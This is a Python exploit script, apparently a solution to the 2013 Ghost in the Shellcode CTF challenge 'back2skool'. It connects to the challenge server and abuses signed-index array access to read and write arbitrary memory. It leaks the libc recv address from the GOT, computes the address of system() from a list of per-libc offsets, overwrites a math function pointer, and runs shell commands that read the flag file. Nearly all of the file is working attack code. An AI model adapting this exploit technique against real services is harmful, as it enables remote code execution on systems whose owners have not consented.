#!/usr/bin/env python

# Lucian Cojocar cojocar .at. gmail.com
# Sun Feb 17 20:25:50 CET 2013
# pwn 250

import socket
import struct
import time

# system() relative to recv in libc
#EXECV_RELA = -0x36E00 # execv_local
#EXECV_RELA = -0x95AF0 # system local
#EXECV_RELA = -0xB1210 # system latest
#EXECV_RELA = -0xB1410 # system 10.2
#EXECV_RELA = -0x9A110 # system libc 6.2.13
#EXECV_RELA = -0xB1900 # system raric

# http://www.youtube.com/watch?v=YWf5BLUOhNM
EXECV_RELA = -0xAF260 # system 'later that day'

def read_buf(s, sz, stop=''):
    ret = ""
    i = 0
    while i < sz:
        c = s.recv(1)
        #print i, "'%s'" % c
        if c in stop:
            break
        ret += c
        i += 1
    return ret

ARRAY_BASE=0x804c040
def read_uint32(s, addr, adjust=True):
    if addr >= (ARRAY_BASE+40):
        v = -(2**31 - (addr-ARRAY_BASE)/4)
    else:
        v = -(ARRAY_BASE-addr)/4

    print "[+] Reading from: %s (%s)" % (hex(addr), v)
    s.send("read\n")
    read_buf(s, 40, '\n')
    s.send("%s\n" % v)
    read_buf(s, 40, ':')
    ret = int(read_buf(s, 40, '\n').strip())
    if ret < 0 and adjust:
        ret += 2**32
    return ret

def write_uint32(s, addr, value):
    print "[+] Writing to: %s -> %s" % (hex(addr), hex(value))
    if value >= 2**31-1:
        #print "[?] I will write a wrong value! (%s)" % (hex(value))
        value = -(2**32-value)

    if addr >= (ARRAY_BASE+40):
        v = -(2**31 - (addr-ARRAY_BASE)/4)
    else:
        v = -(ARRAY_BASE-addr)/4

    if v >= 10:
        print "[!] Failed to write at %s" % hex(addr)

    #print "[+] Writing to: %s (%s) -> %s" % (hex(addr), v, value)

    # cmd
    s.send("write\n")
    read_buf(s, 40, '\n')

    # position
    s.send("%s\n" % v)
    read_buf(s, 40, '\n')

    # value
    s.send("%s\n" % value)
    read_buf(s, 40, ':')
    ret = int(read_buf(s, 40, '\n').strip())
    #print "Wrote: %s" % (hex(ret))
    return ret

def do_connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #s.connect(("localhost", 31337))
    s.connect(("back2skool.2013.ghostintheshellcode.com", 31337))
    return s

def get_libc_recv(s):
    GOT_RECV_PTR = 0x0804BFC0
    libc_recv = read_uint32(s, GOT_RECV_PTR)
    print "[+] recv@libc %s"  % (hex(libc_recv))
    return libc_recv

def set_math_ptr(s, addr):
    MATH_FUNC_PTR = 0x0804C078
    print "[+] Setting math_ptr to %s"  % hex(addr)
    write_uint32(s, MATH_FUNC_PTR, addr)
    print hex(read_uint32(s, MATH_FUNC_PTR))


def send_cmd(s, cmd):
    l = len(cmd)+4
    l -= l%4
    cmd = cmd.ljust(l, '\x00')
    if l/4 > 9:
        print "[?] Cmd too large"

    for i in range(l/4):
        s.send("write\n")
        read_buf(s, 100, '\n')

        v = struct.unpack("<I", cmd[i*4:i*4+4])[0]
        s.send("%s\n" % i)
        read_buf(s, 100, '\n')

        s.send("%s\n" % v)
        read_buf(s, 100, '\n')

def read_all(s):
    l = 0
    while True:
        a = s.recv(1024)
        if len(a) == 0:
            break
        l += len(a)
        print a,
    return l

def do_init():
    s = do_connect()
    print "[+] Receiving crap"
    read_buf(s, 859)
    libc_recv = get_libc_recv(s)
    return (s, libc_recv)

def main():
    (s, libc_recv) = do_init()
    set_math_ptr(s, libc_recv+EXECV_RELA)
    #set_math_ptr(s, 0x08049099) # mult
    #set_math_ptr(s, 0x08049064) # sum

    #send_cmd(s, "/bin/ls -lah /tmp 2>&4 >&4")
    send_cmd(s, "cat /home/back2skool/key 2>&4 >&4")
    #send_cmd(s, "(cat /etc/issue; uname -a) 2>&4 >&4")
    #send_cmd(s, "/bin/sleep 100")
    #send_cmd(s, "/bin/ls -lah /tmp ")

    #libc_execv = libc_recv+EXECV_RELA
    #print "[+] execv@libc %s" % (hex(libc_execv))
    #print hex(read_uint32(s, libc_execv+0))
    #print hex(read_uint32(s, libc_execv+4))
    #print hex(read_uint32(s, libc_execv+8))

    print "[+] Triggering exploit"
    s.send("math\n")

    print read_all(s)

    print "[+] End (%s)"

if __name__ == "__main__":
        main()
